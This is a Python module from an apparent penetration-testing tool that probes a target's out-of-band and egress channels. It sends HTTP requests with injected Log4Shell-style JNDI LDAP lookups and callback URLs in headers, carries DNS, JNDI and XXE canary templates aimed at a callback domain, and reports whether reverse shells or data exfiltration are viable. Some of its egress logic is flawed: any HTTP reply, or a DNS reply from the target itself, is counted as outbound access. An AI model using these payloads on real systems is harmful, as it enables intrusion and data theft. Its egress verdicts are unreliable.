"""
USARE Reverse / Out-of-Band (OOB) Channel Emulation

Detects whether a target can initiate outbound connections by:
1. Crafting payloads that trigger DNS lookups to an attacker-controlled domain
2. Simulating HTTP callback triggers via malformed headers
3. Measuring if the target makes outbound requests (useful for blind SSRF/XXE detection)

For hardened target assessment: determines if outbound egress is filtered,
which affects the viability of reverse shells and data exfiltration.
"""

import socket
import ssl
import time
import random
import string
import logging
import threading
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field

logger = logging.getLogger("usare.reverse_oob")


@dataclass
class OOBResult:
    """Result of an OOB channel probe."""
    channel_type: str          # dns, http, https, icmp
    target_port: int
    payload_sent: str
    callback_received: bool
    latency_ms: Optional[float]
    egress_allowed: bool
    details: str


@dataclass
class EgressProfile:
    """Complete egress filtering profile of the target."""
    dns_egress: bool = False
    http_egress: bool = False
    https_egress: bool = False
    icmp_egress: bool = False
    custom_port_egress: Dict[int, bool] = field(default_factory=dict)
    oob_results: List[OOBResult] = field(default_factory=list)
    assessment: str = "Unknown"


class ReverseOOBEmulator:
    """
    Emulates out-of-band channel detection techniques used in advanced
    penetration testing. Determines egress filtering posture of the target
    without requiring an actual callback server.

    Techniques:
    - DNS OOB: Sends crafted payloads designed to trigger DNS resolution
    - HTTP OOB: Sends HTTP requests with callback-triggering headers
    - Egress Probing: Tests if target's responses indicate outbound access
    """

    # Common egress ports to test
    EGRESS_PORTS = [53, 80, 443, 8080, 8443, 4443, 9090]

    # DNS OOB payload templates (safe — no actual exploitation)
    DNS_OOB_TEMPLATES = [
        "{{{{MARKER}}}}.oob.{domain}",
        "${{jndi:dns://{domain}/{{{{MARKER}}}}}}",  # Log4Shell-style canary
        "<!ENTITY xxe SYSTEM 'http://{domain}/{{{{MARKER}}}}'>",  # XXE-style canary
    ]

    def __init__(self, target_ip: str, callback_domain: str = "internal.test",
                 timeout: float = 3.0):
        self.target_ip = target_ip
        self.callback_domain = callback_domain
        self.timeout = timeout
        self._marker_prefix = ''.join(random.choices(string.ascii_lowercase, k=8))

    def _generate_marker(self) -> str:
        """Generate a unique tracking marker for OOB correlation."""
        suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        return f"{self._marker_prefix}-{suffix}"

    def probe_dns_egress(self, port: int = 53) -> OOBResult:
        """
        Test DNS egress by sending a crafted DNS query to the target
        and observing if DNS resolution behavior leaks information.
        """
        marker = self._generate_marker()
        payload = f"{marker}.dns-test.{self.callback_domain}"

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)

            # Craft a minimal DNS query for our marker subdomain
            dns_query = self._craft_dns_query(payload)

            t0 = time.time()
            sock.sendto(dns_query, (self.target_ip, port))

            try:
                data, addr = sock.recvfrom(1024)
                latency = (time.time() - t0) * 1000

                # Any response (even NXDOMAIN) means DNS egress is possible
                # The target's DNS resolver processed and responded
                return OOBResult(
                    channel_type="dns",
                    target_port=port,
                    payload_sent=payload,
                    callback_received=True,
                    latency_ms=latency,
                    egress_allowed=True,
                    details=f"DNS response received ({len(data)} bytes) — egress via DNS possible"
                )
            except socket.timeout:
                return OOBResult(
                    channel_type="dns",
                    target_port=port,
                    payload_sent=payload,
                    callback_received=False,
                    latency_ms=None,
                    egress_allowed=False,
                    details="No DNS response — port filtered or DNS egress blocked"
                )
        except Exception as e:
            return OOBResult(
                channel_type="dns",
                target_port=port,
                payload_sent=payload,
                callback_received=False,
                latency_ms=None,
                egress_allowed=False,
                details=f"DNS probe error: {e}"
            )
        finally:
            sock.close()
            
        return OOBResult(
            channel_type="dns",
            target_port=port,
            payload_sent="unknown",
            callback_received=False,
            latency_ms=None,
            egress_allowed=False,
            details="Fallback return"
        )

    def probe_http_oob(self, port: int = 80, use_tls: bool = False) -> OOBResult:
        """
        Send HTTP requests with OOB-triggering headers to detect
        if the target processes and follows callback URLs.
        """
        marker = self._generate_marker()
        callback_url = f"http://{marker}.{self.callback_domain}/callback"
        proto = "https" if use_tls else "http"

        # Headers that commonly trigger OOB callbacks in web applications
        oob_headers = [
            f"X-Forwarded-For: {callback_url}",
            f"Referer: {callback_url}",
            f"X-Api-Version: ${{jndi:ldap://{marker}.{self.callback_domain}/a}}",
            f"X-Wap-Profile: {callback_url}",
            f"Contact: {callback_url}",
        ]

        request = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {self.target_ip}\r\n"
            f"User-Agent: Mozilla/5.0 (compatible; USARE/2.0)\r\n"
            + "\r\n".join(oob_headers)
            + "\r\n\r\n"
        )

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)

            t0 = time.time()

            if use_tls:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.target_ip)

            sock.connect((self.target_ip, port))
            sock.sendall(request.encode())

            try:
                response = sock.recv(4096)
                latency = (time.time() - t0) * 1000

                # Analyze response for signs of OOB processing
                response_text = response.decode('utf-8', errors='ignore')
                has_redirect = any(code in response_text for code in ['301', '302', '303', '307'])
                has_error = any(code in response_text for code in ['400', '403', '500', '502'])

                details = f"{proto.upper()} response received ({len(response)} bytes)"
                if has_redirect:
                    details += " — redirect detected (possible callback follow)"
                if has_error:
                    details += " — error response (headers may have been processed)"

                return OOBResult(
                    channel_type=proto,
                    target_port=port,
                    payload_sent=f"OOB headers with marker {marker}",
                    callback_received=bool(response),
                    latency_ms=latency,
                    egress_allowed=True,
                    details=details
                )
            except socket.timeout:
                return OOBResult(
                    channel_type=proto,
                    target_port=port,
                    payload_sent=f"OOB headers with marker {marker}",
                    callback_received=False,
                    latency_ms=None,
                    egress_allowed=False,
                    details=f"{proto.upper()} connection established but no response"
                )
        except (ConnectionRefusedError, ConnectionResetError):
            return OOBResult(
                channel_type=proto,
                target_port=port,
                payload_sent=f"OOB headers with marker {marker}",
                callback_received=False,
                latency_ms=None,
                egress_allowed=False,
                details=f"{proto.upper()} connection refused on port {port}"
            )
        except Exception as e:
            return OOBResult(
                channel_type=proto,
                target_port=port,
                payload_sent=f"OOB headers with marker {marker}",
                callback_received=False,
                latency_ms=None,
                egress_allowed=False,
                details=f"{proto.upper()} probe error: {e}"
            )
        finally:
            try:
                sock.close()
            except Exception:
                pass
                
        return OOBResult(
            channel_type=proto,
            target_port=port,
            payload_sent="unknown",
            callback_received=False,
            latency_ms=None,
            egress_allowed=False,
            details="Fallback return"
        )

    def probe_egress_ports(self, ports: Optional[List[int]] = None) -> Dict[int, bool]:
        """
        Quickly test which common egress ports are reachable from our
        perspective to the target. This maps the firewall's ingress rules.
        """
        test_ports = ports if ports is not None else self.EGRESS_PORTS
        results = {}

        for port in test_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                result = sock.connect_ex((self.target_ip, port))
                results[port] = (result == 0)
                sock.close()
            except Exception:
                results[port] = False

        return results

    def full_egress_assessment(self, open_ports: Optional[List[int]] = None) -> EgressProfile:
        """
        Perform a comprehensive egress filtering assessment.
        """
        profile = EgressProfile()

        # 1. DNS egress test
        logger.info("[OOB] Testing DNS egress channel...")
        dns_result = self.probe_dns_egress()
        profile.dns_egress = dns_result.egress_allowed
        profile.oob_results.append(dns_result)

        # 2. HTTP OOB test (on known open ports or defaults)
        http_ports = [80, 8080]
        if open_ports:
            http_ports = [p for p in open_ports if p in (80, 8080, 8000, 8888)]
            if not http_ports:
                http_ports = [80]

        for port in http_ports[:2]:  # type: ignore[index]
            logger.info(f"[OOB] Testing HTTP OOB on port {port}...")
            http_result = self.probe_http_oob(port=port, use_tls=False)
            profile.oob_results.append(http_result)
            if http_result.egress_allowed:
                profile.http_egress = True

        # 3. HTTPS OOB test
        https_ports = [443, 8443]
        if open_ports:
            https_ports = [p for p in (open_ports or []) if p in (443, 8443, 4443)]
            if not https_ports:
                https_ports = [443]

        for port in https_ports[:2]:  # type: ignore[index]
            logger.info(f"[OOB] Testing HTTPS OOB on port {port}...")
            https_result = self.probe_http_oob(port=port, use_tls=True)
            profile.oob_results.append(https_result)
            if https_result.egress_allowed:
                profile.https_egress = True

        # 4. Egress port mapping
        logger.info("[OOB] Mapping egress port availability...")
        profile.custom_port_egress = self.probe_egress_ports()

        # 5. Generate assessment
        channels = []
        if profile.dns_egress:
            channels.append("DNS")
        if profile.http_egress:
            channels.append("HTTP")
        if profile.https_egress:
            channels.append("HTTPS")

        if channels:
            profile.assessment = (
                f"Egress channels available: {', '.join(channels)}. "
                f"Reverse shell / data exfiltration viable via: {channels[0]}."  # type: ignore[index]
            )
        else:
            profile.assessment = (
                "No egress channels detected. Target is heavily restricted. "
                "Consider bind-shell or in-band only techniques."
            )

        return profile

    @staticmethod
    def _craft_dns_query(domain: str) -> bytes:
        """Craft a minimal DNS A record query."""
        # Transaction ID
        tid = random.randint(0, 65535).to_bytes(2, 'big')
        # Flags: standard query
        flags = b'\x01\x00'
        # Questions: 1, Answers: 0, Authority: 0, Additional: 0
        counts = b'\x00\x01\x00\x00\x00\x00\x00\x00'

        # Encode domain name
        qname = b''
        for label in domain.split('.'):
            qname += len(label).to_bytes(1, 'big') + label.encode()
        qname += b'\x00'

        # Type A (1), Class IN (1)
        qtype = b'\x00\x01'
        qclass = b'\x00\x01'

        return tid + flags + counts + qname + qtype + qclass
